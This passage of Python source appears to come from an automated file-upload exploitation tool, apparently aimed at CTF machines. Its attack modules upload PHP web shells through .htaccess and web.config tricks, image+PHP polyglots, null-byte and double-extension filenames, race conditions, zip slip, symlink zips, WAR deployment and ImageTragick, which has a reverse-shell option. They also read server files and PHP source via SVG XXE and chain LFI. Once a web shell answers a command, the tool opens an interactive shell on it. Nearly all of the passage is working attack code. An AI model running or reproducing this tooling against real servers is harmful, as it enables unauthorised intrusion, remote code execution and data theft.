                    "  1. --htaccess to make .jpg/.png execute as PHP\n"
                    "  2. --polyglot for valid image+PHP polyglots\n"
                    "  3. --char-inject for character injection bypasses\n"
                    "  4. --lfi to include uploaded files via LFI\n"
                    "  5. Check upload dir manually — may differ from default paths\n"
                    "  6. --svg-src upload.php to read source and find the real upload dir")
                # Print curl one-liners for manual verification
                print(f"\n{Y}  Manual verification commands:{W}")
                for a_fn, a_ct, _, _ in accepted[:5]:
                    for d in self.shell_dirs[:3]:
                        print(f"  {G}curl -s '{self.sm.target}{d}{os.path.basename(a_fn)}?cmd=id'{W}")

        fail("Matrix exhausted — no RCE")
        return None, None

    # ── MODULE: .htaccess ────────────────────────────────────────────────────

    def attack_htaccess(self):
        info(f"{'─' * 50}")
        info("MODULE: .htaccess Upload")
        info(f"{'─' * 50}")

        for i, payload in enumerate(HTACCESS_PAYLOADS):
            s, b, _ = self.upload(".htaccess", payload, "text/plain")
            if not self.is_success(s, b):
                # Try alternative content types
                for ct in ["application/octet-stream", "image/jpeg"]:
                    s, b, _ = self.upload(".htaccess", payload, ct)
                    if self.is_success(s, b):
                        break
            if self.is_success(s, b):
                ok(f".htaccess variant {i + 1} uploaded!")
                # Now upload a shell with image extension
                for sname, sbytes in {**SHELLS_PHP, **SHELLS_PHP_MAGIC}.items():
                    for ext in [".jpg", ".png", ".gif", ".txt", ".xxx"]:
                        fn = f"shell{ext}"
                        s2, b2, resp2 = self.upload(fn, sbytes, "image/jpeg")
                        if self.is_success(s2, b2):
                            server_name = self._process_upload_response(fn, b2, resp2)
                            rce_ok, url, param, out = self.verify_rce(fn, server_name)
                            if rce_ok:
                                self.launch_shell(fn, url, param, out, sname, "image/jpeg")
                                return fn, url
        fail(".htaccess attack failed")
        return None, None

    # ── MODULE: web.config (IIS) ─────────────────────────────────────────────

    def attack_webconfig(self):
        info(f"{'─' * 50}")
        info("MODULE: web.config Upload (IIS)")
        info(f"{'─' * 50}")

        s, b, _ = self.upload("web.config", WEBCONFIG, "text/xml")
        if self.is_success(s, b):
            ok("web.config uploaded!")
            # Try to access it
            for d in self.shell_dirs:
                url = f"{self.sm.target}{d}web.config?cmd=whoami"
                try:
                    r = self.sm.session.get(url, timeout=8)
                    if r.status_code == 200 and r.text.strip():
                        self.launch_shell("web.config", url.split("?")[0],
                                          "cmd", r.text.strip(), "webconfig", "text/xml")
                        return "web.config", url
                except:
                    pass
        fail("web.config attack failed")
        return None, None

    # ── MODULE: SVG XXE ──────────────────────────────────────────────────────

    # Common upload response messages — NOT file content
    UPLOAD_MESSAGES = [
        "file successfully uploaded", "successfully uploaded", "upload successful",
        "file uploaded", "uploaded successfully", "upload complete", "success",
        "file saved", "image uploaded", "avatar updated", "profile updated",
        "only images", "not allowed", "invalid", "extension not allowed",
        "file type not", "error", "forbidden", "denied", "too large",
    ]

    def _is_xxe_echoback(self, content, payload):
        """Detect if the response is just the uploaded SVG echoed back (XXE not processed)."""
        # If response still contains the DTD/ENTITY declarations, XXE was NOT processed
        if "<!ENTITY" in content or "<!DOCTYPE" in content:
            return True
        # If response contains the literal &xxe; unexpanded
        if "&xxe;" in content:
            return True
        # If response is basically the same as what we uploaded
        payload_str = payload.decode("utf-8", errors="replace")
        # Fuzzy match — if >80% of payload chars appear in response, it's echo-back
        if len(content) < len(payload_str) * 1.5 and len(content) > len(payload_str) * 0.5:
            overlap = sum(1 for c in payload_str if c in content)
            if overlap > len(payload_str) * 0.8:
                return True
        return False

    def _is_upload_message(self, content):
        """Check if content is just an upload success/error message, not actual file data."""
        cl = content.strip().lower()
        # Short responses that match common upload messages
        if len(cl) < 200:
            for msg in self.UPLOAD_MESSAGES:
                if msg in cl:
                    return True
        return False

    def _extract_xxe_content(self, response_text, variant_name):
        """Extract meaningful content from XXE response, stripping SVG wrapper.

        CRITICAL: Must NOT return generic webpage HTML/text as XXE content.
        Only return data that actually came from the XXE entity expansion.
        """
        text = response_text.strip()

        # ── Phase 1: Look for base64-encoded content (php://filter responses) ──
        if variant_name == "php://filter":
            # Look for a long base64 blob (XXE base64 output is typically 40+ chars)
            b64_pattern = re.findall(r'[A-Za-z0-9+/]{40,}={0,2}', text)
            for b64 in sorted(b64_pattern, key=len, reverse=True):
                try:
                    decoded = base64.b64decode(b64).decode(errors="replace")
                    if len(decoded) > 5:
                        return decoded
                except:
                    pass
            # Strip all HTML tags and try the remaining text as base64
            clean = re.sub(r'<[^>]+>', '', text).strip()
            # Only try if it looks like pure base64 (no spaces, mostly alnum)
            clean_nospace = clean.replace('\n', '').replace('\r', '').replace(' ', '')
            if len(clean_nospace) > 20 and re.match(r'^[A-Za-z0-9+/=]+$', clean_nospace):
                try:
                    decoded = base64.b64decode(clean_nospace.encode()).decode(errors="replace")
                    if len(decoded) > 5:
                        return decoded
                except:
                    pass

        # ── Phase 2: Look inside SVG <text> elements ──
        # This is where XXE content appears when the SVG is rendered
        if BS4_OK:
            try:
                soup = BeautifulSoup(text, "html.parser")
                for tag in soup.find_all("text"):
                    inner = tag.get_text(strip=False)
                    if inner and len(inner.strip()) > 2 and inner.strip() != "&xxe;":
                        # Validate: must look like actual file content, not page text
                        if self._looks_like_file_content(inner.strip()):
                            return inner.strip()
            except:
                pass

        # Regex fallback for SVG <text> extraction
        m = re.search(r'<text[^>]*>([^<]+)</text>', text, re.S)
        if m:
            inner = m.group(1).strip()
            if inner and inner != "&xxe;" and self._looks_like_file_content(inner):
                return inner

        # ── Phase 3: Check if the response itself IS the file content ──
        # (direct SVG access where the server processed the XXE and returned raw text)
        # Only if the response is NOT a full HTML page
        if not re.search(r'<html|<head|<body|<!DOCTYPE\s+html', text, re.I):
            # Strip SVG/XML wrapper if present
            stripped = re.sub(r'<\?xml[^>]*\?>', '', text)
            stripped = re.sub(r'<!DOCTYPE[^>]*>', '', stripped)
            stripped = re.sub(r'</?svg[^>]*>', '', stripped)
            stripped = re.sub(r'</?text[^>]*>', '', stripped)
            stripped = stripped.strip()
            if stripped and len(stripped) > 2 and stripped != "&xxe;":
                if self._looks_like_file_content(stripped):
                    return stripped

        return None

    def _looks_like_file_content(self, content):
        """Heuristic: does this look like actual file data from XXE, not a webpage?"""
        # Known file content indicators
        file_indicators = [
            'root:', '/bin/', '/sbin/', '/usr/',    # /etc/passwd
            '<?php', '<?=', 'function ', 'class ',  # PHP source
            'define(', 'require', 'include',          # PHP source
            'import ', 'from ', 'def ',               # Python
            '{', '}',                                  # JSON/config
            'HTB{', 'THM{', 'FLAG{', 'flag{',        # CTF flags
            '-----BEGIN', 'ssh-rsa', 'ssh-ed25519',  # Keys
            '[global]', '[mysqld]', '[client]',       # Config files
            'DB_HOST', 'DB_PASS', 'SECRET',           # Env vars
            'move_uploaded_file', 'upload', '$_FILES', # Upload PHP
        ]
        for indicator in file_indicators:
            if indicator in content:
                return True

        # Negative indicators — this looks like a webpage, not file content
        webpage_indicators = [
            'Buy now', 'Add to cart', 'Sign up', 'Log in', 'Subscribe',
            'Copyright', 'Privacy Policy', 'Terms of', 'All rights reserved',
            'navbar', 'footer', 'sidebar', 'Categories:', 'What\'s new',
            'Previous', 'Next', 'Home', 'Contact Us', 'Features',
        ]
        page_matches = sum(1 for w in webpage_indicators if w.lower() in content.lower())
        if page_matches >= 2:
            return False

        # If it's short and doesn't match either, allow it (could be a flag file etc.)
        if len(content) < 500:
            return True

        # Long content with no file indicators — probably webpage text
        return False

    def attack_svg_xxe_read(self, filepath):
        info(f"{'─' * 50}")
        info(f"MODULE: SVG XXE File Read → {filepath}")
        info(f"{'─' * 50}")

        for variant_name, payload in [
            ("file://", svg_xxe_file(filepath)),
            ("php://filter", svg_xxe_b64(filepath)),
        ]:
            s, b, _ = self.upload("xxe.svg", payload, "image/svg+xml")
            if not self.is_success(s, b):
                continue

            # Check TWO locations:
            # 1. Direct access to uploaded file (some servers process SVG)
            # 2. The page that displays the image (profile page / upload page)
            urls_to_check = []
            for d in self.shell_dirs:
                urls_to_check.append(f"{self.sm.target}{d}xxe.svg")
            # Also check the upload response itself — some apps render SVG inline
            # But NOT if the response is just "File successfully uploaded" etc.
            if b and not self._is_xxe_echoback(b, payload) and not self._is_upload_message(b):
                content = self._extract_xxe_content(b, variant_name)
                if content and not self._is_upload_message(content):
                    ok(f"XXE read success (in upload response) via {variant_name}!")
                    print(f"\n{G}--- {filepath} ---{W}\n{content[:2000]}")
                    if self.d:
                        self.d.record_xxe(filepath, content)
                    self._check_for_flags(content)
                    return content

            # Check the page where the image is displayed (profile page etc.)
            display_pages = []
            if self.sm.upload_page:
                display_pages.append(urljoin(self.sm.target, self.sm.upload_page))
            display_pages.append(self.sm.target + "/")
            for dp in display_pages:
                try:
                    r = self.sm.session.get(dp, timeout=8)
                    if r.status_code == 200 and not self._is_upload_message(r.text):
                        content = self._extract_xxe_content(r.text, variant_name)
                        if content and not self._is_xxe_echoback(content, payload) \
                                and not self._is_upload_message(content):
                            ok(f"XXE read success (in display page) via {variant_name}!")
                            print(f"\n{G}--- {filepath} ---{W}\n{content[:2000]}")
                            if self.d:
                                self.d.record_xxe(filepath, content)
                            self._check_for_flags(content)
                            return content
                except:
                    pass

            # Check direct access to uploaded SVG
            for url in urls_to_check:
                try:
                    r = self.sm.session.get(url, timeout=8)
                    if r.status_code == 200 and len(r.text.strip()) > 5:
                        # CRITICAL: Check if XXE was actually processed
                        if self._is_xxe_echoback(r.text, payload):
                            debug(f"XXE echo-back at {url} — SVG not processed server-side")
                            continue

                        content = self._extract_xxe_content(r.text, variant_name)
                        if content:
                            ok(f"XXE read success via {variant_name}!")
                            print(f"\n{G}--- {filepath} ---{W}\n{content[:2000]}")
                            if self.d:
                                self.d.record_xxe(filepath, content)
                            self._check_for_flags(content)
                            return content
                except:
                    pass

        fail("SVG XXE read failed (server does not process SVG XML server-side)")
        if self.d:
            self.d.suggest("SVG XXE failed — server serves SVG as static files without XML processing. "
                           "Try RCE-based attacks instead: --smart or --matrix")
        return None

    def _check_for_flags(self, content):
        """Search content for CTF flag patterns."""
        for pattern in [r'HTB\{[^}]+\}', r'THM\{[^}]+\}', r'FLAG\{[^}]+\}',
                        r'flag\{[^}]+\}', r'ctf\{[^}]+\}']:
            flags = re.findall(pattern, content, re.I)
            for flag in flags:
                pwn(f"FLAG: {flag}")
                if self.d:
                    self.d.record_flag(flag)

    def attack_svg_xxe_source(self, php_file):
        info(f"MODULE: SVG XXE Source Read → {php_file}")
        payload = svg_xxe_b64(php_file)
        s, b, _ = self.upload("xxe_src.svg", payload, "image/svg+xml")
        if not self.is_success(s, b):
            return None

        # Check upload response first (but NOT if it's just "File successfully uploaded")
        if b and not self._is_xxe_echoback(b, payload) and not self._is_upload_message(b):
            content = self._extract_xxe_content(b, "php://filter")
            if content and len(content) > 10 and not self._is_upload_message(content):
                ok(f"Source decoded from upload response: {php_file}")
                print(f"\n{G}--- {php_file} ---{W}\n{content[:2000]}")
                if self.d:
                    self.d.record_source(php_file, content)
                self._discover_upload_dirs_from_source(content)
                return content

        # Check display pages
        display_pages = []
        if self.sm.upload_page:
            display_pages.append(urljoin(self.sm.target, self.sm.upload_page))
        display_pages.append(self.sm.target + "/")
        for dp in display_pages:
            try:
                r = self.sm.session.get(dp, timeout=8)
                if r.status_code == 200 and not self._is_upload_message(r.text):
                    content = self._extract_xxe_content(r.text, "php://filter")
                    if content and len(content) > 10 and not self._is_xxe_echoback(content, payload) \
                            and not self._is_upload_message(content):
                        ok(f"Source decoded from display page: {php_file}")
                        print(f"\n{G}--- {php_file} ---{W}\n{content[:2000]}")
                        if self.d:
                            self.d.record_source(php_file, content)
                        self._discover_upload_dirs_from_source(content)
                        return content
            except:
                pass

        # Check direct SVG access
        for d in self.shell_dirs:
            url = f"{self.sm.target}{d}xxe_src.svg"
            try:
                r = self.sm.session.get(url, timeout=8)
                if r.status_code == 200 and r.text.strip():
                    if self._is_xxe_echoback(r.text, payload):
                        debug(f"XXE source echo-back at {url}")
                        continue
                    content = self._extract_xxe_content(r.text, "php://filter")
                    if content and len(content) > 10:
                        ok(f"Source decoded: {php_file}")
                        print(f"\n{G}--- {php_file} ---{W}\n{content[:2000]}")
                        if self.d:
                            self.d.record_source(php_file, content)
                        self._discover_upload_dirs_from_source(content)
                        return content
            except:
                pass

        fail(f"SVG XXE source read failed for {php_file}")
        return None

    def _discover_upload_dirs_from_source(self, source_code):
        """Extract upload directory paths from PHP source code."""
        for m in re.finditer(r"['\"]([./]*[\w]+/[\w/]*)['\"]", source_code):
            c = m.group(1)
            if any(x in c.lower() for x in
                   ["upload", "image", "file", "media", "avatar", "storage"]):
                new_dir = "/" + c.lstrip("./")
                if not new_dir.endswith("/"):
                    new_dir += "/"
                if new_dir not in self.shell_dirs:
                    self.shell_dirs.append(new_dir)
                    ok(f"Upload dir from source: {new_dir}")

    def attack_svg_xss(self):
        info("MODULE: SVG XSS Upload")
        s, b, _ = self.upload("xss.svg", SVG_XSS, "image/svg+xml")
        if self.is_success(s, b):
            ok("SVG XSS payload uploaded")
            for d in self.shell_dirs:
                url = f"{self.sm.target}{d}xss.svg"
                ok(f"XSS at: {url}")
            if self.d:
                self.d.record_vuln("Stored XSS", "SVG with onload handler uploaded", "MEDIUM")
            return True
        return False

    def attack_svg_ssrf(self, target_url):
        info(f"MODULE: SVG SSRF → {target_url}")
        s, b, _ = self.upload("ssrf.svg", svg_ssrf(target_url), "image/svg+xml")
        if self.is_success(s, b):
            ok("SVG SSRF payload uploaded")
            return True
        return False

    # ── MODULE: Race Condition ───────────────────────────────────────────────

    def attack_race(self, attempts=200):
        info(f"{'─' * 50}")
        info("MODULE: Race Condition")
        info(f"{'─' * 50}")

        found = [False]
        result = [None]
        fn = "shell.php"

        # Try multiple shell variants
        shells_to_try = [
            (SHELLS_PHP_MAGIC["gif_system"], "image/gif", "gif_system"),
            (SHELLS_PHP["tiny"], "application/x-php", "tiny"),
            (SHELLS_PHP["system"], "image/jpeg", "system"),
        ]

        for content, ct, sname in shells_to_try:
            found[0] = False
            result[0] = None

            def uploader():
                for _ in range(attempts):
                    if found[0]:
                        break
                    self.upload(fn, content, ct)
                    time.sleep(0.005)

            def accessor():
                for _ in range(attempts * 3):
                    if found[0]:
                        break
                    rce_ok, url, param, out = self.verify_rce(fn)
                    if rce_ok:
                        found[0] = True
                        result[0] = (url, param, out)
                        break
                    time.sleep(0.01)

            threads = []
            for _ in range(3):
                t = threading.Thread(target=uploader, daemon=True)
                threads.append(t)
                t.start()
            for _ in range(3):
                t = threading.Thread(target=accessor, daemon=True)
                threads.append(t)
                t.start()
            for t in threads:
                t.join(timeout=30)

            if result[0]:
                url, param, out = result[0]
                self.launch_shell(fn, url, param, out, sname, ct)
                if self.d:
                    self.d.filter_bypassed("Delete-After-Upload", "race condition")
                return fn, url

        fail("Race condition failed")
        return None, None

    # ── MODULE: Zip Slip ─────────────────────────────────────────────────────

    def attack_zip_slip(self):
        info(f"{'─' * 50}")
        info("MODULE: Zip Slip (Path Traversal)")
        info(f"{'─' * 50}")

        zip_data = make_zipslip()
        for ct in ["application/zip", "application/octet-stream",
                    "application/x-zip-compressed"]:
            s, b, _ = self.upload("evil.zip", zip_data, ct)
            if self.is_success(s, b):
                ok("Zip uploaded — checking for extracted shell...")
                rce_ok, url, param, out = self.verify_rce("shell.php")
                if rce_ok:
                    self.launch_shell("shell.php (zip slip)", url, param, out,
                                      "zip_slip", ct)
                    return "shell.php", url
        fail("Zip slip failed")
        return None, None

    # ── MODULE: Symlink Zip (NEW) ────────────────────────────────────────────

    def attack_symlink_zip(self, target_file="/etc/passwd"):
        info(f"{'─' * 50}")
        info(f"MODULE: Symlink Zip → {target_file}")
        info(f"{'─' * 50}")

        zip_data = make_symlink_zip(target_file)
        s, b, _ = self.upload("symlink.zip", zip_data, "application/zip")
        if self.is_success(s, b):
            ok("Symlink zip uploaded — checking for extracted symlink...")
            for d in self.shell_dirs:
                for name in ["symlink.txt", "symlink"]:
                    url = f"{self.sm.target}{d}{name}"
                    try:
                        r = self.sm.session.get(url, timeout=8)
                        if r.status_code == 200 and r.text.strip():
                            ok(f"Symlink read success!")
                            print(f"\n{G}--- {target_file} ---{W}\n{r.text[:2000]}")
                            if self.d:
                                self.d.record_xxe(f"symlink:{target_file}", r.text)
                                self.d.record_vuln("Symlink Zip File Read",
                                    f"Read {target_file} via symlink in uploaded zip", "HIGH")
                            return r.text
                    except:
                        pass
        fail("Symlink zip failed")
        return None

    # ── MODULE: WAR Deployment (NEW) ─────────────────────────────────────────

    def attack_war_deploy(self):
        info(f"{'─' * 50}")
        info("MODULE: WAR File Deployment (Tomcat/JBoss)")
        info(f"{'─' * 50}")

        war_data = make_war_file()
        app_name = "cmd"

        # Try uploading as .war
        for ct in ["application/x-war-archive", "application/java-archive",
                    "application/zip", "application/octet-stream"]:
            s, b, _ = self.upload(f"{app_name}.war", war_data, ct)
            if self.is_success(s, b):
                ok("WAR uploaded — checking deployment...")
                # Tomcat auto-deploys to /{app_name}/
                for base_path in [f"/{app_name}/", f"/{app_name}/cmd.jsp"]:
                    url = f"{self.sm.target}{base_path}"
                    test_url = f"{url}?cmd=id" if "jsp" in base_path else f"{url}cmd.jsp?cmd=id"
                    try:
                        r = self.sm.session.get(test_url, timeout=10)
                        if r.status_code == 200 and any(x in r.text for x in ["uid=", "root", "www-data"]):
                            shell_url = test_url.split("?")[0]
                            self.launch_shell(f"{app_name}.war", shell_url,
                                              "cmd", r.text.strip(), "war_deploy", ct)
                            return f"{app_name}.war", shell_url
                    except:
                        pass
                # Also check shell dirs
                rce_ok, url, param, out = self.verify_rce("cmd.jsp")
                if rce_ok:
                    self.launch_shell("cmd.war", url, param, out, "war_deploy", ct)
                    return "cmd.war", url
        fail("WAR deployment failed")
        return None, None

    # ── MODULE: ImageTragick ─────────────────────────────────────────────────

    def attack_imagetragick(self, cmd="id", read_file=None, revshell=None):
        info(f"{'─' * 50}")
        info("MODULE: ImageTragick (CVE-2016-3714)")
        info(f"{'─' * 50}")

        payloads = []

        # Command injection variant
        payloads.append(("imagetragick_rce", imagetragick_rce(cmd)))

        # Label file read variant (NEW)
        if read_file:
            payloads.append(("imagetragick_label", imagetragick_label_read(read_file)))
            payloads.append(("imagetragick_msl", imagetragick_ephemeral_read(read_file)))

        # Reverse shell variant (NEW)
        if revshell:
            ip, port = revshell.split(":")
            payloads.append(("imagetragick_revshell", imagetragick_revshell(ip, port)))

        for name, payload in payloads:
            for ext in [".mvg", ".svg", ".png", ".jpg", ".gif"]:
                for ct in ["image/svg+xml", "image/png", "image/jpeg", "image/gif"]:
                    fn = f"exploit{ext}"
                    s, b, resp = self.upload(fn, payload, ct)
                    if self.is_success(s, b):
                        ok(f"ImageTragick payload uploaded: {fn} ({name})")
                        if name == "imagetragick_rce":
                            # Check if command executed (response might contain output)
                            if any(x in b for x in ["uid=", "root", "www-data"]):
                                pwn(f"ImageTragick RCE in response!")
                                print(f"  Output: {b[:300]}")
                                if self.d:
                                    self.d.record_vuln("ImageTragick RCE",
                                        "Command executed via image processing", "CRITICAL")
                                return True
        fail("ImageTragick failed")
        return False

    # ── MODULE: PNG IDAT Polyglot (NEW) ──────────────────────────────────────

    def attack_png_polyglot(self):
        info(f"{'─' * 50}")
        info("MODULE: PNG IDAT Polyglot (valid PNG + PHP)")
        info(f"{'─' * 50}")

        for php_code, sname in [
            (b"<?=`$_GET[0]`?>", "png_idat_tiny"),
            (b"<?php system($_GET['cmd']); ?>", "png_idat_system"),
        ]:
            png = make_png_idat_polyglot(php_code)
            png_raw = make_png_idat_raw_polyglot(php_code)

            for data, variant in [(png, "idat"), (png_raw, "idat_raw")]:
                # Try various double-extension tricks
                for fn in [f"shell.php.png", f"shell.png.php",
                           f"shell.php%00.png", f"shell.php",
                           f"shell.phtml", f"shell.pht"]:
                    s, b, resp = self.upload(fn, data, "image/png")
                    if self.is_success(s, b):
                        ok(f"PNG polyglot uploaded: {fn} ({variant})")
                        server_name = self._process_upload_response(fn, b, resp)
                        rce_ok, url, param, out = self.verify_rce(fn, server_name)
                        if rce_ok:
                            self.launch_shell(fn, url, param, out,
                                              f"{sname}_{variant}", "image/png")
                            return fn, url

        # Also try after .htaccess
        info("Trying PNG polyglot + .htaccess combo...")
        for ht in HTACCESS_PAYLOADS[:2]:
            s, b, _ = self.upload(".htaccess", ht, "text/plain")
            if self.is_success(s, b):
                png = make_png_idat_raw_polyglot(b"<?=`$_GET[0]`?>")
                for ext in [".png", ".jpg", ".gif"]:
                    fn = f"shell{ext}"
                    s2, b2, resp2 = self.upload(fn, png, f"image/{ext[1:]}")
                    if self.is_success(s2, b2):
                        server_name = self._process_upload_response(fn, b2, resp2)
                        rce_ok, url, param, out = self.verify_rce(fn, server_name)
                        if rce_ok:
                            self.launch_shell(fn, url, param, out,
                                              "png_polyglot_htaccess", f"image/{ext[1:]}")
                            return fn, url

        fail("PNG polyglot attack failed")
        return None, None

    # ── MODULE: JPEG Polyglot ────────────────────────────────────────────────

    def attack_jpeg_polyglot(self):
        info("MODULE: JPEG Polyglot (valid JPEG + PHP)")

        for php_code, sname in [
            (b"<?=`$_GET[0]`?>", "jpeg_poly_tiny"),
            (b"<?php system($_GET['cmd']); ?>", "jpeg_poly_system"),
        ]:
            jpeg = make_jpeg_polyglot(php_code)

            for fn in ["shell.php.jpg", "shell.jpg.php",
                       "shell.php%00.jpg", "shell.php"]:
                s, b, resp = self.upload(fn, jpeg, "image/jpeg")
                if self.is_success(s, b):
                    ok(f"JPEG polyglot uploaded: {fn}")
                    server_name = self._process_upload_response(fn, b, resp)
                    rce_ok, url, param, out = self.verify_rce(fn, server_name)
                    if rce_ok:
                        self.launch_shell(fn, url, param, out, sname, "image/jpeg")
                        return fn, url

        fail("JPEG polyglot failed")
        return None, None

    # ── MODULE: GIF Polyglot ─────────────────────────────────────────────────

    def attack_gif_polyglot(self):
        info("MODULE: GIF Polyglot (valid GIF89a + PHP)")

        for php_code, sname in [
            (b"<?=`$_GET[0]`?>", "gif_poly_tiny"),
            (b"<?php system($_GET['cmd']); ?>", "gif_poly_system"),
        ]:
            gif = make_gif_polyglot(php_code)

            for fn in ["shell.php.gif", "shell.gif.php",
                       "shell.php%00.gif", "shell.php"]:
                s, b, resp = self.upload(fn, gif, "image/gif")
                if self.is_success(s, b):
                    ok(f"GIF polyglot uploaded: {fn}")
                    server_name = self._process_upload_response(fn, b, resp)
                    rce_ok, url, param, out = self.verify_rce(fn, server_name)
                    if rce_ok:
                        self.launch_shell(fn, url, param, out, sname, "image/gif")
                        return fn, url

        fail("GIF polyglot failed")
        return None, None

    # ── MODULE: Raw Null Byte in Multipart (NEW) ─────────────────────────────

    def attack_raw_null_byte(self):
        info(f"{'─' * 50}")
        info("MODULE: Raw Null Byte in Multipart Header")
        info(f"{'─' * 50}")

        for sname, sbytes in list(SHELLS_PHP.items())[:3]:
            for img in [".jpg", ".png", ".gif"]:
                # Raw \x00 in the filename bytes
                raw_fn = f"shell.php\x00{img}".encode("latin-1")
                s, b, resp = self.upload_raw_multipart(
                    f"shell.php{img}", sbytes, "image/jpeg",
                    raw_filename_bytes=raw_fn)
                if self.is_success(s, b):
                    ok(f"Raw null byte accepted! (shell.php\\x00{img})")
                    # Server may have stored as shell.php (truncated at null)
                    for fn_check in ["shell.php", f"shell.php{img}"]:
                        rce_ok, url, param, out = self.verify_rce(fn_check)
                        if rce_ok:
                            self.launch_shell(fn_check, url, param, out,
                                              sname, "image/jpeg")
                            return fn_check, url
        fail("Raw null byte failed")
        return None, None

    # ── MODULE: Chunked Transfer Encoding (NEW) ──────────────────────────────

    def attack_chunked(self):
        info(f"{'─' * 50}")
        info("MODULE: Chunked Transfer Encoding Bypass")
        info(f"{'─' * 50}")

        for sname, sbytes in [("system", SHELLS_PHP["system"]),
                               ("tiny", SHELLS_PHP["tiny"]),
                               ("gif_system", SHELLS_PHP_MAGIC["gif_system"])]:
            for fn in ["shell.php", "shell.phtml", "shell.php.jpg"]:
                s, b, resp = self.upload_chunked(fn, sbytes, "image/jpeg")
                if self.is_success(s, b):
                    ok(f"Chunked upload accepted: {fn}")
                    server_name = self._process_upload_response(fn, b, resp)
                    rce_ok, url, param, out = self.verify_rce(fn, server_name)
                    if rce_ok:
                        self.launch_shell(fn, url, param, out,
                                          f"chunked_{sname}", "image/jpeg")
                        return fn, url
        fail("Chunked encoding bypass failed")
        return None, None

    # ── MODULE: LFI Chaining (NEW) ───────────────────────────────────────────

    def attack_lfi_chain(self, uploaded_files=None):
        info(f"{'─' * 50}")
        info("MODULE: LFI Chaining (include uploaded file)")
        info(f"{'─' * 50}")

        # First upload a PHP shell with image extension/CT
        shells_uploaded = []
        for sname, sbytes in SHELLS_PHP_MAGIC.items():
            for fn in ["shell.jpg", "shell.png", "shell.gif"]:
                s, b, resp = self.upload(fn, sbytes, f"image/{fn.split('.')[1]}")
                if self.is_success(s, b):
                    shells_uploaded.append(fn)
                    server_name = self._process_upload_response(fn, b, resp)
                    if server_name:
                        shells_uploaded.append(server_name)
                    break
            if shells_uploaded:
                break

        if not shells_uploaded and uploaded_files:
            shells_uploaded = uploaded_files

        if not shells_uploaded:
            fail("Could not upload any file for LFI chaining")
            return None

        # Now try LFI inclusion
        target_url = self.sm.target
        test_paths = []
        for d in self.shell_dirs:
            for fn in shells_uploaded:
                test_paths.append(f"..{d}{fn}")
                test_paths.append(f"../..{d}{fn}")
                test_paths.append(f"../../..{d}{fn}")
                test_paths.append(f"{d}{fn}")

        # Also try disclosed paths
        if self.d:
            for dp in self.d.disclosed_paths:
                for fn in shells_uploaded:
                    test_paths.append(f"{dp}/{fn}")

        pages_to_test = ["/", "/index.php", "/home.php", "/page.php",
                         "/view.php", "/display.php", "/content.php"]

        if self.sm.upload_page:
            pages_to_test.insert(0, self.sm.upload_page)

        count = 0
        total = len(pages_to_test) * len(LFI_PARAMS) * len(test_paths)
        for page in pages_to_test:
            for param in LFI_PARAMS:
                for path in test_paths:
                    count += 1
                    if count % 200 == 0:
                        progress(count, total, "LFI")
                    url = f"{target_url}{page}?{param}={quote(path)}&cmd=id&0=id"
                    try:
                        r = self.sm.session.get(url, timeout=5)
                        if r.status_code == 200 and any(x in r.text for x in
                                ["uid=", "root", "www-data"]):
                            pwn(f"LFI inclusion works! {param}={path}")
                            shell_url = f"{target_url}{page}?{param}={quote(path)}"
                            self.launch_shell(f"LFI:{path}", shell_url,
                                              "cmd", r.text.strip()[:200],
                                              "lfi_chain", "lfi")
                            return path
                    except:
                        pass

        print()  # Clear progress line
        fail("LFI chaining failed")
        return None

    # ── MODULE: Error-Based Path Disclosure (NEW) ────────────────────────────

    def attack_error_disclosure(self):
        info(f"{'─' * 50}")
        info("MODULE: Error-Based Path Disclosure")
        info(f"{'─' * 50}")

        disclosed = []
        filenames = gen_error_filenames()

        for fn in filenames:
            s, b, _ = self.upload(fn, b"test", "image/jpeg")
            paths = ResponseParser.extract_error_paths(b)
            for p_item in paths:
                if p_item not in disclosed:
                    disclosed.append(p_item)
                    vuln(f"Path disclosed: {p_item}")
                    if self.d:
                        self.d.record_path(p_item, "error_disclosure")

                    # Convert to web directory and add to shell_dirs
                    # Try to extract the web root relative path
                    for webroot in ["/var/www/html", "/var/www", "/srv/http",
                                    "/usr/share/nginx/html", "/home", "/app"]:
                        if webroot in p_item:
                            rel = p_item[len(webroot):]
                            dirname = os.path.dirname(rel)
                            if dirname and dirname + "/" not in self.shell_dirs:
                                self.shell_dirs.append(dirname + "/")
                                ok(f"Added upload dir: {dirname}/")

        if disclosed:
            ok(f"Disclosed {len(disclosed)} paths")
            if self.d:
                self.d.record_vuln("Path Disclosure",
                    f"Error messages reveal server paths: {disclosed[:3]}", "LOW")
        else:
            info("No paths disclosed from error messages")
        return disclosed

    # ── MODULE: Directory Enumeration ────────────────────────────────────────

    def attack_dir_enum(self, wordlist=None):
        info(f"{'─' * 50}")
        info("MODULE: Upload Directory Enumeration")
        info(f"{'─' * 50}")

        dirs_to_check = list(DEFAULT_SHELL_DIRS)

        # Try to load external wordlist
        if wordlist:
            try:
                with open(wordlist) as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith("#"):
                            d = f"/{line.strip('/')}/"
                            if d not in dirs_to_check:
                                dirs_to_check.append(d)
                info(f"Loaded {len(dirs_to_check)} dirs from wordlist")
            except:
                warn(f"Could not load wordlist: {wordlist}")
        else:
            # Try common wordlist locations
            for wl_path in WORDLIST_PATHS:
                if os.path.exists(wl_path):
                    try:
                        count = 0
                        with open(wl_path) as f:
                            for line in f:
                                line = line.strip()
                                if line and not line.startswith("#"):
                                    # Focus on upload-related directories
                                    if any(kw in line.lower() for kw in
                                           ["upload", "file", "image", "media",
                                            "avatar", "content", "storage",
                                            "asset", "static", "public",
                                            "tmp", "temp", "data", "doc"]):
                                        d = f"/{line.strip('/')}/"
                                        if d not in dirs_to_check:
                                            dirs_to_check.append(d)
                                            count += 1
                        if count:
                            info(f"Added {count} dirs from {wl_path}")
                    except:
                        pass
                    break

        found_dirs = []
        total = len(dirs_to_check)
        for i, d in enumerate(dirs_to_check):
            if i % 20 == 0:
                progress(i, total, "DirEnum")
            url = f"{self.sm.target}{d}"
            try:
                r = self.sm.session.get(url, timeout=5)
                if r.status_code in [200, 403, 301, 302]:
                    found_dirs.append(d)
                    if d not in self.shell_dirs:
                        # Insert at FRONT — discovered dirs are most likely correct
                        self.shell_dirs.insert(0, d)
                    elif self.shell_dirs.index(d) > 5:
                        # Move to front if it was buried deep in the list
                        self.shell_dirs.remove(d)
                        self.shell_dirs.insert(0, d)
                    ok(f"Dir found (HTTP {r.status_code}): {url}", 2)
            except:
                pass
        print()

        ok(f"Found {len(found_dirs)} accessible directories")
        for d in found_dirs:
            print(f"    {G}→{W} {d}")

        if self.d:
            for d in found_dirs:
